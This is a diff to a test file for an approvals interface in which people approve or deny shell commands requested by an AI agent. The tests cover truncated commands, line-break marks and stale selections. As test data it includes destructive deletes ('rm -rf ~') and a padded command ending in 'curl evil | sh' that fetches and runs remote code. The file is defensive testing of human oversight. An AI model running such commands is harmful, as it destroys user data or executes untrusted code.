@@ -423,10 +423,12 @@ test('a request not shown as sent says so on its row on every face, keeps the li
   assert.ok(whole.includes(`class="dp-row-why" aria-label="${escaped(`The Wait set on its agent's Scope passed with no answer. ${LINE_2O} Show raw is in the pane.`)}"`), whole)
   // The tile: standing words in the card's own line.
   assert.equal(tile.split(SENT).length - 1, 1, tile)
-  assert.match(tile, /<div class="ap-card-line">.*?<span>rm -rf \.\/build<\/span><small class="ap-sent">not as sent<\/small><\/div>/)
+  // be2p-2: the standing words stand before the command, which wraps on the card's line.
+  assert.match(tile, /<div class="ap-card-line ap-card-line--cmd">.*?<b>aletheia<\/b><small class="ap-sent">not as sent<\/small><code class="ap-card-cmd">rm -rf \.\/build<\/code><\/div>/)
   // The pane: the words on the row, and the whole line and the raw form, open, above Approve.
-  assert.match(pane, /<span class="ap-flag">Held past its Wait[^<]* · not as sent<\/span>/)
-  assert.equal(pane.split('not as sent</span>').length - 1, 1, 'the pane: one row says it')
+  // be2p ruling 4: "not as sent" stands first in the cell, before the flag.
+  assert.match(pane, /<span class="ap-flag">not as sent · Held past its Wait[^<]*<\/span>/)
+  assert.equal(pane.split('<span class="ap-flag">not as sent').length - 1, 1, 'the pane: one row says it')
   assert.ok(pane.indexOf(`role="note" data-flagged="true">${LINE_2O}</p>`) > 0 && pane.indexOf(`data-flagged="true">${LINE_2O}</p>`) < pane.indexOf('<div class="ap-do">'), 'the line stands above the answers')
   assert.ok(pane.includes('<details class="ap-raw" open="">'), pane)
   // A flag alone, and the line alone, stand as they did.
@@ -547,5 +549,247 @@ test('the button that opens the pane is named for what it does, and where no pan
   const plainInput = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
   const plain = hosted(approvalsDesign, rec.approvalsBinding(plainInput, {})).join('\n')
   assert.ok(plain.includes('>Approve</button>') && !plain.includes('Read as sent') && !plain.includes('ap-where'), 'a plain request is approved where it stands')
+  bind.resetHolds()
+})
+
+// ── be2p (DLW build ruling 2026-11-11): the follow-ups of the review of O-I #969 ─────────────────────────────────────────────────────
+const asking2p = (id, choices, command = 'ls') => ({...CONSENT, native_request_id: id, tool_call_id: `call:${id}`, tool_call: {kind: 'execute', title: 'Bash', rawInput: {command}}, choices})
+const CHOICES_2P = {
+  allowNow: [{option_id: 'go', label: 'Allow now'}, {option_id: 'stop', label: 'Deny'}],
+  mixed: [{option_id: 'once', kind: 'allow_once', label: 'Allow'}, {option_id: 'session', label: 'Allow for this session, no more prompts'}],
+  onlyYes: [{option_id: 'yes-forever', label: 'Yes, and do not ask again'}],
+  kinds: [{option_id: 'a', kind: 'allow_once', label: 'Allow once'}, {option_id: 'w', kind: 'allow_always', label: 'Always'}, {option_id: 'r', kind: 'reject_once', label: 'Reject'}],
+  alwaysOnly: [{option_id: 'w', kind: 'allow_always', label: 'Always'}, {option_id: 'never', kind: 'reject_always', label: 'Never'}],
+}
+/** A face's own button of a label, pressed: the SDK's Action on the whole view and the tile, the pane's own button in the pane. */
+const pressOf = (view, nodes, label) => (view === 'full' ? buttonsOf(nodes, label)[0]?.props.onClick : actionsOf(nodes, label)[0]?.props.onPress)
+
+// be2p ruling 1, pinned on the faces that were right: Approvals' Approve sends the harness's allow for this time or nothing, and its Deny
+// sends a choice of a reject kind or the cancelled outcome, on the whole view, the tile and the pane, through the host's set and flush.
+// Approvals draws no words of its own after an answer: the row stands until AIKit reports the request answered, and a refusal is the
+// host's, said on the Info line.
+test('Approvals\' Approve sends the allow for this time or nothing, and Deny a reject kind or the cancelled outcome, whatever the labels say (be2p ruling 1)', async () => {
+  const NO_ONCE = 'The request offers no once choice; answer it in the thread pane.'
+  const pick = option_id => [{outcome: 'selected', option_id}], CANCELLED = [{outcome: 'cancelled'}]
+  const expected = {
+    allowNow: {Approve: [[], NO_ONCE], Deny: [CANCELLED, null]},
+    mixed: {Approve: [pick('once'), null], Deny: [CANCELLED, null]},
+    onlyYes: {Approve: [[], NO_ONCE], Deny: [CANCELLED, null]},
+    kinds: {Approve: [pick('a'), null], Deny: [pick('r'), null]},
+    alwaysOnly: {Approve: [[], NO_ONCE], Deny: [pick('never'), null]},
+  }
+  for (const [name, choices] of Object.entries(CHOICES_2P)) for (const view of ['whole', 'widget', 'full']) for (const label of ['Approve', 'Deny']) {
+    bind.resetHolds(); host.resetHost()
+    const sent = []
+    const input = {session: SESSION, encounter: encounter([asking2p('req-k', choices)]), holds: bind.chainHolds()}
+    const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { sent.push([id, decision]) }})
+    const face = propsOn(binding, picked(input, 'req-k'))
+    const p = {...face.p, set: (key, value) => { face.sets.push([key, value]); host.setHosted(binding, key, value) }}
+    pressOf(view, nodesOf(approvalsDesign[view](p)), label)()
+    assert.deepEqual(face.sets, [[label === 'Approve' ? 'allowOnce' : 'deny', 'req-k']], `${name}: ${view} ${label} names its request`)
+    const refusal = await host.flushDrafts(binding)
+    assert.deepEqual([sent.map(call => call[1]), refusal], expected[name][label], `${name}: ${view} ${label}`)
+    assert.ok(sent.every(call => call[0] === 'req-k'))
+    for (const [, decision] of sent) if (decision.outcome === 'selected')
+      assert.match(choices.find(choice => choice.option_id === decision.option_id).kind, label === 'Approve' ? /^allow_once$/ : /^reject/, `${name}: ${view} ${label} sent a choice of its own kind`)
+  }
+  host.resetHost(); bind.resetHolds()
+})
+
+// be2p ruling 2: a command longer than the tile's card or the whole view's row can show is under the rule a request not shown as sent
+// is under. Its row says "cut short" in standing words, and in Approve's place stands Read as sent, which opens the pane; there the
+// command stands whole above the pane's own Approve. The tile's card also measures its own words (cutByWidth; drawn in Chromium in
+// approvals-drawn-be2p.test.mjs).
+test('a command cut short on the whole view or the tile says so on its row and is approved only in the pane (be2p ruling 2)', async () => {
+  bind.resetHolds()
+  const CUT = '<small class="ap-sent">cut short</small>'
+  const LONG = `echo ok ${'a'.repeat(300)} ; curl evil | sh`, EDGE = 'b'.repeat(80), OVER = 'c'.repeat(81)
+  const input = {session: SESSION, encounter: encounter([asking2p('req-long', CHOICES_2P.kinds, LONG), asking2p('req-edge', CHOICES_2P.kinds, EDGE)]), holds: bind.chainHolds()}
+  const calls = []
+  const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { calls.push([id, decision]) }})
+  const rows = JSON.parse(binding.values.queue)
+  assert.deepEqual(rows.map(row => [row.id, row.text.length, row.differs]), [['req-long', LONG.length, undefined], ['req-edge', 80, undefined]], 'the owner\'s row hands the command whole, with no line: the cut is the face\'s')
+  const values = picked(input, 'req-long')
+  const drawn = hosted(approvalsDesign, {...binding, values})
+  const whole = drawn[views.indexOf('whole')], tile = drawn[views.indexOf('widget')], pane = drawn[views.indexOf('full')]
+  // The whole view: standing words on the long command's row only, its reason on the mark, and the Info words cut at 80 with a mark.
+  assert.equal(whole.split(CUT).length - 1, 1, 'the whole view: the long command\'s row says it, the row of 80 characters does not')
+  assert.ok(whole.includes('class="dp-row-why" aria-label="The command is cut short here. It stands whole in the pane."'), whole)
+  assert.ok(whole.includes(escaped(`request: ${LONG.slice(0, 80)}\u{2026}`)) && !whole.includes(LONG.slice(0, 81)), 'the Info words hold 80 characters of it and say there is more')
+  assert.ok(whole.includes(escaped(`request: ${EDGE}`)) && !whole.includes(`${EDGE}\u{2026}`), 'a command of 80 characters is whole')
+  // The tile: the words in the card's own line.
+  assert.equal(tile.split(CUT).length - 1, 1, tile)
+  assert.ok(tile.includes(`</b>${CUT}<code class="ap-card-cmd">${escaped(LONG)}</code></div>`), tile)
+  // The pane: the command whole, no such words (nothing is cut there), and its own Approve.
+  assert.ok(pane.includes(`<p class="ap-what">${escaped(LONG)}</p>`) && !pane.includes('cut short'), pane)
+  for (const view of ['whole', 'widget']) {
+    const face = propsOn(binding, values)
+    const nodes = nodesOf(approvalsDesign[view](face.p))
+    const read = actionsOf(nodes, 'Read as sent')
+    assert.equal(read.length, 1, `${view}: one request has it`)
+    assert.equal(actionsOf(nodes, 'Approve').length, view === 'widget' ? 1 : 0, `${view}: the long command has no Approve; the tile's other card keeps its own`)
+    assert.equal(read[0].props.does, 'Opens the pane, where the request stands as it was sent. Approve it there. The command is cut short here.', view)
+    assert.deepEqual([read[0].props.hold, read[0].props.disabled], [undefined, undefined], view)
+    read[0].props.onPress()
+    assert.deepEqual(face.sets, [['pick', 'req-long'], ['nav.full']], `${view}: the item is chosen and the pane opens; nothing is answered`)
+    actionsOf(nodes, 'Deny')[0].props.onPress()
+    assert.deepEqual(face.sets.at(-1), ['deny', 'req-long'], `${view}: Deny still declines from here`)
+    // Where no pane opens from the face: disabled, and the words beside it say where to answer.
+    const shut = propsOn(binding, values, {})
+    const closed = nodesOf(approvalsDesign[view](shut.p))
+    assert.match(actionsOf(closed, 'Read as sent')[0].props.disabled, /^No pane opens from here/, view)
+    assert.equal(closed.filter(node => node.type === 'p' && node.props.className === 'ap-where').map(node => node.props.children).join('|'), 'Cut short: answer it in the Approvals pane.', view)
+  }
+  // The command of exactly 80 characters is approved where it stands; one of 81 is not.
+  const edge = propsOn(binding, picked(input, 'req-edge'))
+  actionsOf(nodesOf(approvalsDesign.whole(edge.p)), 'Approve')[0].props.onPress()
+  assert.deepEqual(edge.sets, [['allowOnce', 'req-edge']])
+  const over = {...binding, values: {...values, queue: JSON.stringify([{id: 'o', kind: 'request', who: 'Kite', text: OVER}]), pick: 'o'}}
+  assert.deepEqual([actionsOf(nodesOf(approvalsDesign.whole(propsOn(over).p)), 'Approve').length, actionsOf(nodesOf(approvalsDesign.whole(propsOn(over).p)), 'Read as sent').length], [0, 1])
+  // In the pane Approve answers: the command stands whole above it.
+  const inPane = propsOn(binding, values)
+  buttonsOf(nodesOf(approvalsDesign.full(inPane.p)), 'Approve')[0].props.onClick()
+  assert.deepEqual(inPane.sets, [['allowOnce', 'req-long']])
+  // Not a command: a decision in its owner's words, and a proposal, are answered where they stand however long their words are.
+  const other = {...binding, values: {...values, pick: 'u1', queue: JSON.stringify([{id: 'u1', kind: 'request', who: 'Factory', text: LONG, options: {allowOnce: 'Resume bounded work', deny: 'Cancel bounded work'}},
+    {id: 'p1', kind: 'proposal', who: 'Kite', text: LONG, where: 'notes.md'}])}}
+  const otherDrawn = hosted(approvalsDesign, other)
+  assert.ok(!otherDrawn[views.indexOf('whole')].includes('cut short') && !otherDrawn[views.indexOf('widget')].includes('cut short'))
+  const unit = propsOn(other)
+  actionsOf(nodesOf(approvalsDesign.whole(unit.p)), 'Resume bounded work')[0].props.onPress()
+  assert.deepEqual(unit.sets, [['allowOnce', 'u1']])
+  // A request that is both: "not as sent" is the word, once, and the line is the one that names what is not shown.
+  const laced = {...binding, values: {...values, pick: 'l', queue: JSON.stringify([{id: 'l', kind: 'request', who: 'Kite', text: LONG, flag: 'recursive delete', differs: LINE_2O}, {id: 'f', kind: 'request', who: 'Kite', text: LONG, flag: 'recursive delete'}])}}
+  const lacedWhole = hosted(approvalsDesign, laced)[views.indexOf('whole')]
+  assert.deepEqual([lacedWhole.split('<small class="ap-sent">not as sent</small>').length - 1, lacedWhole.split(CUT).length - 1], [1, 1])
+  assert.ok(lacedWhole.includes(`aria-label="${escaped(`recursive delete. ${LINE_2O} Show raw is in the pane.`)}"`) && lacedWhole.includes('aria-label="recursive delete. The command is cut short here. It stands whole in the pane."'), lacedWhole)
+  assert.equal(actionsOf(nodesOf(approvalsDesign.whole(propsOn(laced).p)), 'Read as sent')[0].props.does, `Opens the pane, where the request stands as it was sent. Approve it there. ${LINE_2O}`)
+  // The measure the tile's card takes of its own words.
+  const {cutByWidth} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')
+  assert.deepEqual([cutByWidth({scrollWidth: 101, clientWidth: 100}), cutByWidth({scrollWidth: 100, clientWidth: 100}), cutByWidth({scrollWidth: 0, clientWidth: 0})], [true, false, false])
+  bind.resetHolds()
+})
+
+// be2p-2 (DLW build ruling 2026-11-11): on the tile a request's command stands after who asks on a line that wraps on up to four lines
+// (laid out in approvals-drawn-be2p.test.mjs). A real line break in it carries a mark, so a break the command holds is told from one the
+// card's width made. Words that are not a command stay on the card's one line. The block is what the card measures: by height as by width.
+test('the tile draws a command on a line that wraps, marks a real line break, and keeps other words on one line (be2p-2)', async () => {
+  bind.resetHolds()
+  const input = {session: SESSION, encounter: encounter([asking2p('req-two', CHOICES_2P.kinds, 'echo one\n  rm -rf ~\nls'), asking2p('req-one', CHOICES_2P.kinds, 'ls  -la')]), holds: bind.chainHolds()}
+  const binding = rec.approvalsBinding(input, {permission: async () => {}})
+  const tile = hosted(approvalsDesign, binding)[views.indexOf('widget')]
+  const MARK = '<i class="ap-nl" aria-label="line break">\u{21b5}</i>'
+  assert.ok(tile.includes(`<code class="ap-card-cmd">echo one${MARK}\n  rm -rf ~${MARK}\nls</code>`), tile)
+  assert.ok(tile.includes('<code class="ap-card-cmd">ls  -la</code>'), 'one line: no mark, its white space kept')
+  assert.equal(tile.split(MARK).length - 1, 2)
+  // The command of several lines is still "not as sent" (the queue's own line says it has 3 lines), so Read as sent stands for it.
+  const nodes = nodesOf(approvalsDesign.widget(propsOn(binding).p))
+  assert.deepEqual([actionsOf(nodes, 'Read as sent').length, actionsOf(nodes, 'Approve').length], [1, 1])
+  // A proposal and a decision in its owner's words: one line beside who, no block.
+  const others = hosted(approvalsDesign, {...binding, values: {...binding.values, queue: JSON.stringify([{id: 'p1', kind: 'proposal', who: 'Kite', text: 'notes.md\nmore'}, {id: 'u1', kind: 'request', who: 'Factory', text: 'Resume?', options: {allowOnce: 'Resume', deny: 'Cancel'}}])}})[views.indexOf('widget')]
+  assert.ok(!others.includes('ap-card-cmd') && !others.includes('ap-card-line--cmd') && !others.includes('ap-nl') && others.includes('<span>notes.md more</span>') && others.includes('<span>Resume?</span>'), others)
+  // The measure: a block cut by its height counts as one cut by its width does.
+  const {cutByWidth} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')
+  assert.deepEqual([cutByWidth({scrollWidth: 100, clientWidth: 100, scrollHeight: 55, clientHeight: 54}), cutByWidth({scrollWidth: 100, clientWidth: 100, scrollHeight: 54, clientHeight: 54}),
+    cutByWidth({scrollWidth: 101, clientWidth: 100, scrollHeight: 54, clientHeight: 54})], [true, false, true])
+  const css = read('inhabitants/catalogue/panels/software-factory__approvals.css')
+  assert.match(css, /\.ap-card-line--cmd \{[^}]*-webkit-line-clamp: 4;[^}]*overflow-wrap: anywhere;/, 'four lines, a break anywhere in a long word')
+  assert.match(css, /\.ap-card-cmd \{[^}]*white-space: pre-wrap;/, 'the command\'s white space kept')
+  bind.resetHolds()
+})
+
+// be2p ruling 3: the item under Approve changes only when the person chooses. When the chosen request leaves the queue, the pane and the
+// whole view do not stand on the next one: they say the item is gone and nothing there approves anything until a row is chosen again. A
+// press drawn before the change and landing after it names the request that left, and answers nothing.
+test('when the chosen request goes, the pane and the whole view say so and approve nothing until the person chooses again (be2p ruling 3)', async () => {
+  const GONE = 'The item that stood here is no longer in this list: it was answered or withdrawn, or Show leaves it out. Choose one in the queue.'
+  const ANSWERS = new Set(['allowOnce', 'allowAlways', 'deny', 'approve', 'reject', 'changes', 'refineAccept', 'refineDiscard', 'confirm', 'recognise', 'close', 'continue'])
+  for (const view of ['full', 'whole']) {
+    bind.resetHolds(); host.resetHost()
+    const sent = []
+    const before = {session: SESSION, encounter: encounter([CONSENT, SECOND]), holds: bind.chainHolds()}
+    const after = {...before, encounter: encounter([SECOND])}
+    // Central's acceptance is handed too, so Approve on the whole view stands on the face's own reason and no other.
+    const ports = {permission: async (id, decision) => { sent.push([id, decision]) }, approve: async () => { sent.push(['approve']) }, reject: async () => { sent.push(['reject']) }}
+    const drawnOn = (input, pick) => { const binding = rec.approvalsBinding(input, ports), face = propsOn(binding, picked(input, pick))
+      const p = {...face.p, set: (key, value) => { face.sets.push([key, value]); host.setHosted(binding, key, value) }}
+      return {binding, sets: face.sets, p, nodes: nodesOf(approvalsDesign[view](p)), markup: hosted(approvalsDesign, {...binding, values: p.v})[views.indexOf(view)]} }
+    // Before: the face stands on the chosen request, and its Approve is that request's.
+    const was = drawnOn(before, 'req-7')
+    const stale = pressOf(view, was.nodes, 'Approve')
+    assert.equal(typeof stale, 'function', `${view}: Approve is live on the chosen request`)
+    // After: the chosen request has left. The face says so and no control on it sets an answer.
+    const now = drawnOn(after, 'req-7')
+    assert.ok(now.markup.includes(view === 'full' ? `<p class="ap-empty" role="note">${escaped(GONE)}</p>` : '<p class="ap-where" role="note">The item chosen has left this list. Choose one in the queue.</p>'), now.markup)
+    if (view === 'full') {
+      assert.ok(!now.markup.includes('<div class="ap-do">') && !now.markup.includes('aria-pressed="true"'), 'the pane: no item stands, so no answer button, and no row is the chosen one')
+      assert.ok(!now.markup.includes('<p class="ap-what">'), 'the next request is not drawn in its place')
+    } else {
+      const approves = actionsOf(now.nodes, 'Approve')
+      assert.deepEqual(approves.map(action => [action.props.disabled, action.props.onPress]), [[GONE, undefined]], 'the whole view: Approve stands disabled with the reason, and has no press')
+    }
+    for (const node of now.nodes) for (const handler of ['onPress', 'onClick']) if (typeof node.props?.[handler] === 'function' && !node.props.disabled && node.props.role !== 'row' && !('items' in node.props)) {
+      try { node.props[handler]({}) } catch { /* a control that needs a real event sets nothing */ }
+    }
+    assert.deepEqual(now.sets.filter(([key]) => ANSWERS.has(key)), [], `${view}: no control on the face sets an answer`)
+    assert.equal(await host.flushDrafts(now.binding), null)
+    assert.deepEqual(sent, [], `${view}: and nothing reached the session`)
+    // The press drawn before the change, landing after it: it names the request that left, and the host says the refusal.
+    host.resetHost()
+    stale()
+    assert.deepEqual(was.sets, [['allowOnce', 'req-7']])
+    host.resetHost()
+    host.setHosted(now.binding, 'allowOnce', 'req-7')
+    assert.equal(await host.flushDrafts(now.binding), 'That request no longer waits: AIKit reports it answered or gone.')
+    assert.deepEqual(sent, [], `${view}: the request that still waits was not approved in its place`)
+    // The person chooses again: the face stands on that request and Approve is its own.
+    host.resetHost()
+    const again = drawnOn(after, 'req-9')
+    pressOf(view, again.nodes, 'Approve')()
+    assert.equal(await host.flushDrafts(again.binding), null)
+    assert.deepEqual(sent, [['req-9', {outcome: 'selected', option_id: 'second-once'}]])
+    // Nothing chosen yet: the face stands on the first that waits, as before (and then holds it as the choice: drawn in Chromium).
+    const fresh = drawnOn(before, undefined)
+    pressOf(view, fresh.nodes, 'Approve')()
+    assert.equal(fresh.sets.at(-1)[0], 'allowOnce')
+    // An empty queue has nothing to choose, so nothing is said to be gone; a choice Show leaves out is under the same words.
+    const empty = drawnOn({...before, encounter: encounter([])}, 'req-7')
+    assert.ok(!empty.markup.includes('no longer in this list') && !empty.markup.includes('has left this list'), empty.markup)
+    assert.ok(!was.markup.includes('no longer in this list') && !was.markup.includes('has left this list'), 'and nothing is said while the chosen item stands')
+    const hidden = rec.approvalsBinding(before, ports)
+    const hiddenMarkup = hosted(approvalsDesign, {...hidden, values: {...picked(before, 'req-7'), show: 'proposals', queue: JSON.stringify([...JSON.parse(hidden.values.queue), {id: 'p1', kind: 'proposal', who: 'Kite', text: 'notes.md'}])}})[views.indexOf(view)]
+    assert.ok(hiddenMarkup.includes(view === 'full' ? escaped(GONE) : 'The item chosen has left this list.'), hiddenMarkup)
+  }
+  host.resetHost(); bind.resetHolds()
+})
+
+// be2p ruling 5 (the review's F5, mutant m10): the standing words do not need a flag beside them. A request not shown as sent that is
+// not flagged, not urgent and not past its Wait still says "not as sent" on its row on the whole view, the tile and the pane.
+test('an unflagged request not shown as sent still says so in standing words on every face (be2p ruling 5)', () => {
+  bind.resetHolds()
+  const SENT = '<small class="ap-sent">not as sent</small>'
+  const input = {session: SESSION, encounter: encounter([LACED_2O]), holds: bind.chainHolds()}
+  const binding = rec.approvalsBinding(input, {permission: async () => {}})
+  assert.equal(JSON.parse(binding.values.queue)[0].flag, undefined, 'the row carries no flag')
+  const drawn = hosted(approvalsDesign, {...binding, values: picked(input, 'req-8')})
+  const whole = drawn[views.indexOf('whole')], tile = drawn[views.indexOf('widget')], pane = drawn[views.indexOf('full')]
+  assert.equal(whole.split(SENT).length - 1, 1, whole)
+  assert.ok(whole.includes(`class="dp-row-why" aria-label="${escaped(`${LINE_2O} Show raw is in the pane.`)}"`), 'and its mark carries the line alone')
+  assert.equal(tile.split(SENT).length - 1, 1, tile)
+  assert.ok(pane.includes('<span class="ap-flag">not as sent</span>'), pane)
+  bind.resetHolds()
+})
+
+// be2p ruling 4: in the pane's list "not as sent" stands before the flag. The cell is 104 px wide and cuts its end, and a flag is a
+// sentence, so the words that gate the answer are the ones that stay. (Drawn at the cell's width in approvals-drawn-be2p.test.mjs.)
+test('in the pane\'s list "not as sent" stands before a flag, and before "urgent" (be2p ruling 4)', () => {
+  bind.resetHolds()
+  const input = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
+  const binding = rec.approvalsBinding(input, {permission: async () => {}})
+  const queue = JSON.stringify([{id: 'a', kind: 'request', who: 'Kite', text: 'rm', flag: 'Held past its Wait: nobody answered', differs: LINE_2O}, {id: 'b', kind: 'request', who: 'Kite', text: 'ls', urgent: true, differs: LINE_2O},
+    {id: 'c', kind: 'request', who: 'Kite', text: 'ls', flag: 'recursive delete'}, {id: 'd', kind: 'request', who: 'Kite', text: 'ls', differs: LINE_2O}])
+  const pane = hosted(approvalsDesign, {...binding, values: {...binding.values, queue, pick: 'a', follow: false}})[views.indexOf('full')]
+  assert.deepEqual([...pane.matchAll(/<span class="ap-flag">([^<]*)<\/span>/g)].map(match => match[1]).sort(),
+    ['not as sent', 'not as sent \u{b7} Held past its Wait: nobody answered', 'not as sent \u{b7} urgent', 'recursive delete'])
   bind.resetHolds()
 })
